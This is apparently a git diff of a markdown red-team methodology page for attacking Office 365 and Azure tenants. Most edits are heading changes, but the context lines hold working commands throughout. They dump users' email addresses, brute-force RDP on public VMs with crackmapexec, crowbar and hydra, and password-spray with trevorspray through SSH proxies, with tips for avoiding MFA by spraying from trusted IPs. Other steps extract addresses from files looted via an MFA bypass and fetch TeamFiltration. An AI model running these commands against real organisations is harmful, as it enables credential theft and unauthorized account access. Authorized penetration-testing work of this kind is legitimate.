@@ -7,13 +7,12 @@ category: 'Cloud'
 ---
 
 ### Office 365 / Graph Methodology
-
 Phishing using AAdinternals, TokenTactics, Azurehound, Trevorspray/o365spray, MAAD-AF. 
 
-Needs PhirstPhish stuff
-Needs AzureHound
-Needs Teamfiltration
-Needs O365 creeper, Road-Tools, Blobhunter, 
+Needs PhirstPhish stuff to replace the Intitla Phish section, it's lacking
+Needs AzureHound stuff
+Needs O365 creeper, Road-Tools, Blobhunter I guess.
+Look at the azure methopdology, a lot of overlap 
 
 ### Clone and Install Modules
 ```powershell
@@ -141,20 +140,20 @@ $groups = Get-AzureADGroup -All $true | Export-Csv -Path "groups.csv" -NoTypeInf
 ```
 
 
-# Extract the email addresses of the users
+### Extract the email addresses of the users
 ```powershell
 $emailAddresses = $users | Select-Object -ExpandProperty UserPrincipalName
 ```
 
 
-# Output the email addresses to a text file
+### Output the email addresses to a text file
 ```powershell
 $emailAddresses | Out-File -FilePath 'emails.txt'
 ```
 
 
 ### Start 2nd Spray with emails gathered
-## Alternate Spray with TrevorSpray Proxied through EC2
+### Alternate Spray with TrevorSpray Proxied through EC2
 ```powershell 
 pip install git+https://github.com/blacklanternsecurity/trevorproxy
 pip install git+https://github.com/blacklanternsecurity/trevorspray
@@ -257,37 +256,42 @@ $publicIps | Export-Csv -Path "VmIPs.csv" -NoTypeInformation
 
 
 
-# Brute Force VMs with Public IPs
+## Brute Force VMs with Public IPs
 
-# crackmapexec
+### crackmapexec
 ```powershell 
 ./cme rdp $VMIP -u $user -P $wordlist 
 ```
 
-# CrowBar
+### CrowBar
 ```bash
 sudo apt install -y nmap openvpn freerdp2-x11 tigervnc-viewer   python3 python3-pip
 git clone https://github.com/galkan/crowbar
 cd crowbar/
 pip3 install -r requirements.txt
+```
 
-# First VM, trying admin account, Single IP, User, Passwordlist
+### First VM, trying admin account, Single IP, User, Passwordlist
+```bash 
 VMIP=""
 cidr=""
 user="adelev"
 wordlist="shortpass.txt"
 wordlist2=".\O365\loot\shortpass.txt"
 ./crowbar.py -b rdp -s $VMIP -u $user -C $wordlist shortpass.txt
+```
+
+```bash
 # Hydra
 hydra -t 1 -V -f -l $user -P $wordlist rdp://$VMIP
 ```
 
 ######################################### PHASE II ###########################################################################
 ## Password Spraying
-## Can run from TrustedIP space here to avoid MFA / Simulate Trusted Network
-## Can run from an AzureIP / Cloud Shell for trusted-ish external IP
+### Can run from TrustedIP space here to avoid MFA / Simulate Trusted Network
+### Can run from an AzureIP / Cloud Shell for trusted-ish external IP
 
-## TrevorSpray from TrustedIP/Shell/AzNix (try proxy through cloud shell)
+### TrevorSpray from TrustedIP/Shell/AzNix (try proxy through cloud shell)
 ```bash
 pip install git+https://github.com/blacklanternsecurity/trevorproxy
 pip install git+https://github.com/blacklanternsecurity/trevorspray
@@ -296,7 +300,7 @@ tenant="shrine.cloud"
 password="Password123!"
 ```
 
-# Recon
+### Recon
 ```bash
 trevorspray --recon $tenant
 ```
@@ -306,16 +310,19 @@ trevorspray --recon $tenant
 ```bash
 trevorspray --recon $tenant -u emails.txt --threads 10
 
+
 # --delay         Sleep for this many seconds between requests
 # --lockout-delay Sleep for this many additional seconds when a lockout is encountered
 # --jitter        Add a random delay of up to this many seconds between requests
+```
 
+```bash
 trevorspray -u emails.txt -p $password --ssh root@1.2.3.4 root@4.3.2.1 --delay 30 --lockout-delay 30 --jitter 10
 ```
 
 
 ### Workflow - Spray Token Endpoint Slow
-## Recon for URL
+### Recon for URL
 ```bash
 trevorspray --recon $tenant
 url=""
@@ -343,7 +350,7 @@ proxy2=""
 trevorspray -u emails.txt -p $password --ssh mellonaut@$proxy2 ansible@$proxy1
 ```
 
-## Trevor Spray Extract LZX files looted from MFA bypass
+### Trevor Spray Extract LZX files looted from MFA bypass
 ### get libmspack (for extracting LZX file)
 ```bash
 git clone https://github.com/kyz/libmspack
@@ -353,7 +360,7 @@ cd libmspack/libmspack/
 make
 ```
 
-# extract LZX file
+### extract LZX file
 ```bash
 ./examples/.libs/oabextract ~/.trevorspray/loot/deadbeef-ce01-4ec9-9d08-1050bdc41131-data-1.lzx oab.bin
 
@@ -363,7 +370,7 @@ strings oab.bin
 egrep -oa '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}' oab.bin | tr '[:upper:]' '[:lower:]' | sort -u
 ```
 
-## TrevorSpray Find ValidUsernames without OSINT
+### TrevorSpray Find ValidUsernames without OSINT
 ### clone wordsmith dataset
 ```bash
 tenant="shrine.cloud"
@@ -381,14 +388,14 @@ done | tee f.last.txt
 trevorspray -u f.last.txt -p 'Welcome123'
 ```
 
-## TeamFiltration Linux
+### TeamFiltration Linux
 ```powershell
 iwr https://github.com/Flangvik/TeamFiltration/releases/download/v3.5.0/TeamFiltration-Linux-v3.5.0.zip -o teamfiltration.zip
 unzip ./teamfiltration.zip
 ./teamfiltration
 ```
 
-# TeamFiltration Windows
+### TeamFiltration Windows
 ```powershell
 iwr https://github.com/Flangvik/TeamFiltration/releases/download/v3.5.0/TeamFiltration-Win-v3.5.0.zip -o teamfiltration.zip
 
